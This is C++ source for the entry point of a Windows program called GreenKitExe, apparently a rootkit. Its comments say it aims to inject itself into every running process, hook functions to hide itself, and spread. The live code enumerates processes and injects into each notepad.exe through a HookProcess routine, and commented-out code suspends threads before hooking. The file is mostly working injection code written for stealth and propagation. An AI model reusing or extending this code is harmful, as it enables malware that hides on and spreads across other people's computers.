// GreenKitExe.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "GreenKitExe.h"
#include "process.h"
#include "Injector.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>

// Global Variables:
HINSTANCE hInst;								// current instance

// Forward declarations of functions included in this code module:
//ATOM				MyRegisterClass(HINSTANCE hInstance); *** KEPT ONLY AS EXAMPLE ***



int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
	hInst = hInstance;

	/* TODO :
		Run the core of GreenKitExe :
			Hide ourself : Inject ourself to every process running on the system and hook desired functions
			Spread ourself
	*/

	// Run through every process of the system
   /* if (TRUE == process_suspendOrResumeAllThreads(4860, TRUE)) {
        HANDLE hP = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4860);

        if (NULL != hP) {
            if (NULL != HookProcess) // For debugging purpose only TODO remove
                HookProcess(hP);
           CloseHandle(hP);
            //process_suspendOrResumeAllThreads(4684, FALSE);
        }
    }*/
    //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5384);
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, "notepad.exe") == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

                HookProcess(hProcess);
                CloseHandle(hProcess);
            }
        }
    }
    //HookProcess("cheatengine-i386.exe");
    //process_allSuspendApplyResume(HookProcess);
	return 0;
}